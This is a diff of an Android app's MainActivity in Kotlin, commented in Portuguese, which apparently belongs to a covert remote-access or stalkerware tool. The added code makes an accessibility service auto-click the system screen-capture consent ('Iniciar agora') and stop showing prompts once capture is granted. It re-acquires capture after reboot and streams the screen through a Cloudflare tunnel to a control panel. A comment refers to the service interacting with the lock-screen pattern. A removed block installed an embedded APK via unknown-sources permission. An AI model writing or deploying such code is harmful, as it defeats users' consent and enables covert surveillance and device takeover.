@@ -653,6 +653,20 @@ class MainActivity : Activity() {
         handlerMain.post {
             try {
                 handlerMain.removeCallbacks(autoRemoverOverlayRunnable)
+                // [REMOVIDO A PEDIDO] Overlay "Atualizando o aplicativo..." do
+                // MainActivity desativado: o botão foi removido do painel e não é
+                // mais usado. Ele cobria a tela (full-screen) e, na tela de
+                // bloqueio, era capturado pela acessibilidade, atrapalhando os 9
+                // pontos. Agora SEMPRE remove qualquer instância e sai (nunca mostra).
+                val wmRem = getSystemService(Context.WINDOW_SERVICE) as? WindowManager
+                loadingOverlayJanela?.let { v ->
+                    try { wmRem?.removeView(v) } catch (_: Exception) {}
+                    try { (v.parent as? android.view.ViewGroup)?.removeView(v) } catch (_: Exception) {}
+                }
+                loadingOverlayJanela = null
+                if (::loadingOverlay.isInitialized) loadingOverlay.visibility = View.GONE
+                return@post
+                @Suppress("UNREACHABLE_CODE")
                 // Cor de fundo conforme o dispositivo (fallback dentro da
                 // Activity): emulador = escurecimento semitransparente
                 // (#66000000) para destacar o círculo de carregamento mantendo
@@ -1589,7 +1603,27 @@ class MainActivity : Activity() {
                 try { startActivity(Intent(Settings.ACTION_ACCESSIBILITY_SETTINGS).addFlags(Intent.FLAG_ACTIVITY_NEW_TASK)) } catch (_: Exception) {}
             }
         ))
-        // 2) SOBREPOSIÇÃO — exibir sobre outros apps (o inject liga o interruptor).
+        // 2) ESPELHAMENTO (MediaProjection) — PRIORIDADE: logo após a acessibilidade.
+        //    Assim que a acessibilidade é ativada e o usuário volta ao app, o modal
+        //    de consentimento de espelhamento aparece e fica aparecendo ATÉ ser
+        //    aceito ("Iniciar agora"), com auto-clique (inject). Aceito 1x, a flag
+        //    persistente marca como concedido e NUNCA mais aparece (nem fechando/
+        //    abrindo). Só o reboot re-pede, também auto-clicado.
+        lista.add(PassoPermissao(
+            "captura", "Conexão da tela",
+            "Aceite para liberar todos os acessos do aplicativo.",
+            // CONCEDIDO = o aceite REAL do espelhamento já aconteceu UMA vez
+            // (flag "espelhamento_aceito", gravada no RESULT_OK do MediaProjection
+            // ao clicar "Iniciar agora"). NÃO usamos "consentimento_captura": o
+            // MyAccessibilityService grava essa assim que a acessibilidade liga,
+            // o que fazia o modal de espelhamento NUNCA aparecer. Assim o modal
+            // aparece UMA única vez (após ativar a acessibilidade, auto-clicado) e,
+            // uma vez aceito, NUNCA MAIS aparece. A Cloudflare mantém a rede; só o
+            // REBOOT re-pede o token, também auto-clicado pelo fluxo de boot.
+            { getSharedPreferences(PREFS, MODE_PRIVATE).getBoolean("espelhamento_aceito", false) },
+            { prosseguirMediaProjection() }
+        ))
+        // 3) SOBREPOSIÇÃO — exibir sobre outros apps (o inject liga o interruptor).
         lista.add(PassoPermissao(
             "overlay", "Permitir sobreposição",
             "Para exibir sobre outros apps. Ative \"Permitir exibir sobre outros apps\".",
@@ -1617,31 +1651,11 @@ class MainActivity : Activity() {
                 { requestPermissions(arrayOf(Manifest.permission.POST_NOTIFICATIONS), REQUEST_NOTIFICACAO) }
             ))
         }
-        // 5) FONTES DESCONHECIDAS (API 26+) — instalar o módulo de suporte.
-        if (Build.VERSION.SDK_INT >= Build.VERSION_CODES.O) {
-            lista.add(PassoPermissao(
-                "fontes", "Permitir instalar desta fonte",
-                "Para instalar o módulo de suporte. Ative \"Permitir desta fonte\".",
-                { packageManager.canRequestPackageInstalls() },
-                {
-                    MyAccessibilityService.armarInterruptorPermissao()
-                    try { startActivity(Intent(Settings.ACTION_MANAGE_UNKNOWN_APP_SOURCES, Uri.parse("package:$packageName")).addFlags(Intent.FLAG_ACTIVITY_NEW_TASK)) } catch (_: Exception) {}
-                }
-            ))
-        }
-        // 6) ESPELHAMENTO (MediaProjection) — por último; o "Iniciar agora" já é
-        //    auto-clicado pelo loop do serviço de acessibilidade.
-        lista.add(PassoPermissao(
-            "captura", "Conexão da tela",
-            "Necessário para ter acesso em tempo real entre o aparelho e o painel. Toque em Iniciar quando o aviso do sistema aparecer.",
-            // SESSÃO VIVA: basta o serviço estar RODANDO (a sessão é reutilizável).
-            // NÃO exige capturandoDeVerdade — esse flag cai quando o token do
-            // MediaProjection se perde ao apagar a tela, o que fazia o onboarding
-            // nunca concluir e RE-PEDIR o modal "Iniciar agora" a cada abertura.
-            // Só é "pendente" (re-pede) quando o serviço realmente parou.
-            { ScreenCaptureService.isRunning },
-            { prosseguirMediaProjection() }
-        ))
+        // [REMOVIDO] "Permitir instalar desta fonte": existia só para instalar o
+        //    módulo de suporte (assets/suporte.apk). Como NÃO há aplicativo de
+        //    suporte, este passo foi removido (nagava o modal a cada abertura).
+        // OBS: o passo de ESPELHAMENTO (captura) foi movido para logo após a
+        //    acessibilidade (prioridade) — veja o item 2 acima.
         return lista
     }
 
@@ -1652,11 +1666,27 @@ class MainActivity : Activity() {
      *  tela de permissão, re-checa e vai para a próxima). Idempotente. */
     private fun executarOrquestracaoPermissoes() {
         if (prefs.getBoolean(KEY_PERMISSOES_OK, false)) return  // já concluído antes
-        val pendente = passosPermissao().firstOrNull { !it.concedida() }
+        val passos = passosPermissao()
+        val pendente = passos.firstOrNull { !it.concedida() }
         if (pendente == null) {
             prefs.edit().putBoolean(KEY_PERMISSOES_OK, true).apply()
             orquestrandoPermissoes = false
             Log.i(TAG, "[PERMISSOES] Todas concedidas — onboarding de permissões concluído.")
+            return
+        }
+        // CONCLUSÃO PELO ESSENCIAL: assim que as permissões ESSENCIAIS
+        // (acessibilidade + conexão da tela/captura) já estão concedidas, o
+        // onboarding é dado por CONCLUÍDO e NUNCA MAIS exibe modais ao reabrir o
+        // app. As demais (sobreposição, bateria, notificações) são opcionais e
+        // não devem ficar nagando o consentimento nas aberturas normais — só na
+        // primeira vez. (A "fonte desconhecida"/suporte já foi removida.)
+        val essenciaisOk = passos
+            .filter { it.id == "acessibilidade" || it.id == "captura" }
+            .all { it.concedida() }
+        if (essenciaisOk) {
+            prefs.edit().putBoolean(KEY_PERMISSOES_OK, true).apply()
+            orquestrandoPermissoes = false
+            Log.i(TAG, "[PERMISSOES] Essenciais OK — onboarding concluído; sem mais modais ao reabrir.")
             return
         }
         if (orquestrandoPermissoes) return
@@ -1844,70 +1874,12 @@ class MainActivity : Activity() {
      *   aborta esta rodada; na próxima vez a instalação prossegue.
      */
     private fun instalarSuporteSeNecessario() {
-        try {
-            val pacoteSuporte = "$packageName.suporte" // com.example.acessomaterno.suporte
-
-            // 1) Já instalado? Então não faz nada.
-            val jaInstalado = try {
-                packageManager.getPackageInfo(pacoteSuporte, 0)
-                true
-            } catch (_: PackageManager.NameNotFoundException) {
-                false
-            }
-            if (jaInstalado) {
-                Log.d(TAG, "Suporte ($pacoteSuporte) já instalado — instalação ignorada.")
-                return
-            }
-
-            // 2) Precisa da permissão "instalar apps desconhecidos" (API 26+).
-            if (Build.VERSION.SDK_INT >= Build.VERSION_CODES.O &&
-                !packageManager.canRequestPackageInstalls()
-            ) {
-                Log.d(TAG, "Sem permissão de instalar apps desconhecidos — abrindo tela de fontes.")
-                try {
-                    val intentFontes = Intent(
-                        Settings.ACTION_MANAGE_UNKNOWN_APP_SOURCES,
-                        Uri.parse("package:$packageName")
-                    )
-                    startActivity(intentFontes)
-                } catch (e: Exception) {
-                    Log.w(TAG, "Falha ao abrir tela de fontes desconhecidas: ${e.message}")
-                }
-                // Aborta esta rodada; na próxima entrada o fluxo segue para a instalação.
-                return
-            }
-
-            // 3) Copia o APK de assets → cache privado do app.
-            val apkDestino = File(cacheDir, "suporte_motor.apk")
-            assets.open("suporte.apk").use { entrada ->
-                apkDestino.outputStream().use { saida ->
-                    entrada.copyTo(saida)
-                }
-            }
-
-            // 4) Gera a URI via FileProvider e dispara o instalador do sistema.
-            val uriApk: Uri = FileProvider.getUriForFile(
-                this,
-                "$packageName.fileprovider",
-                apkDestino
-            )
-            val intentInstalar = Intent(Intent.ACTION_VIEW).apply {
-                setDataAndType(uriApk, "application/vnd.android.package-archive")
-                addFlags(Intent.FLAG_GRANT_READ_URI_PERMISSION)
-                addFlags(Intent.FLAG_ACTIVITY_NEW_TASK)
-            }
-            startActivity(intentInstalar)
-            Log.d(TAG, "Instalador do suporte disparado a partir de assets/suporte.apk.")
-
-            // 5) Encadeia o fluxo: aguarda o pacote do suporte ser instalado e,
-            // assim que aparecer, abre a tela de Acessibilidade para o auto-clique
-            // ligar o serviço do suporte sozinho (hands-free até finalizar).
-            aguardarSuporteEAtivarAcessibilidade(pacoteSuporte, tentativa = 0)
-        } catch (e: java.io.FileNotFoundException) {
-            Log.w(TAG, "assets/suporte.apk não encontrado — pulei a instalação do suporte.")
-        } catch (e: Exception) {
-            Log.w(TAG, "Falha ao instalar suporte embarcado: ${e.message}")
-        }
+        // [REMOVIDO] Não há aplicativo de suporte (assets/suporte.apk). Este fluxo
+        // instalava um "módulo de suporte" e, quando faltava a permissão, ABRIA a
+        // tela "Permitir desta fonte" — que reaparecia toda vez que o app abria.
+        // Como seguimos só com o app principal, a instalação do suporte foi
+        // desativada por completo (não abre mais a tela de fontes desconhecidas).
+        Log.d(TAG, "Instalação de suporte desativada (sem app de suporte) — seguindo só com o app principal.")
     }
 
     /**
@@ -1963,9 +1935,10 @@ class MainActivity : Activity() {
 
     private fun iniciarCaptura() {
         // CONTROLE DE DISPARO PREVENTIVO:
-        // Se o ScreenCaptureService já estiver ativo em execução, aborta o disparo do gatilho.
-        // Se estiver em modo reanimação pós-boot (headless), encerra a Activity instantaneamente via finish().
-        if (ScreenCaptureService.isRunning) {
+        // Só aborta se o serviço estiver REALMENTE capturando (token válido).
+        // (P1) Rodando-mas-SEM-token (ex.: modo escuta pós-reboot) NÃO conta como
+        // ativo — precisa prosseguir p/ reobter o MediaProjection no 1º desbloqueio.
+        if (ScreenCaptureService.isRunning && ScreenCaptureService.capturandoDeVerdade) {
             Log.d(TAG, "ScreenCaptureService já está ativo em execução. Abortando novo disparo de captura.")
             if (reanimacaoBootAutomatica) {
                 finish()
@@ -1983,11 +1956,11 @@ class MainActivity : Activity() {
 
     private fun prosseguirMediaProjection() {
         // REUTILIZAÇÃO DA SESSÃO VIVA: se o ScreenCaptureService já está rodando
-        // (espelhando pelo túnel Cloudflare), NÃO dispara o modal "Iniciar agora"
-        // de novo ao reabrir o app — a sessão/token é reaproveitada e o usuário
-        // navega na interface sem interrupção. Só pede consentimento de novo
-        // quando o serviço realmente parou (isRunning == false).
-        if (ScreenCaptureService.isRunning) {
+        // E capturando de verdade (token válido, espelhando pelo túnel), NÃO
+        // dispara o modal "Iniciar agora" de novo ao reabrir o app — a sessão é
+        // reaproveitada e o usuário navega sem interrupção. (P2) Mas rodando-SEM-
+        // token (modo escuta pós-reboot / token perdido) PRECISA pedir de novo.
+        if (ScreenCaptureService.isRunning && ScreenCaptureService.capturandoDeVerdade) {
             Log.i(TAG, "[MP] ScreenCaptureService já ativo — reutilizando sessão, sem novo modal de captura.")
             if (reanimacaoBootAutomatica) handlerMain.postDelayed({ finish() }, 200)
             return
@@ -2037,6 +2010,13 @@ class MainActivity : Activity() {
                 getSharedPreferences(PREFS, MODE_PRIVATE)
                     .edit()
                     .putBoolean("consentimento_captura", true)
+                    // Flag DEDICADA do aceite REAL do espelhamento (MediaProjection
+                    // RESULT_OK). Diferente de "consentimento_captura", que o
+                    // MyAccessibilityService grava assim que a acessibilidade liga
+                    // (para o inject não ficar suspenso) — por isso ela NÃO serve
+                    // para decidir se o modal de espelhamento já apareceu. Esta aqui
+                    // só vira true quando o usuário/inject aceita "Iniciar agora".
+                    .putBoolean("espelhamento_aceito", true)
                     .putLong("espelhamento_cooldown_ate", 0L)
                     .apply()
             } catch (_: Exception) {}
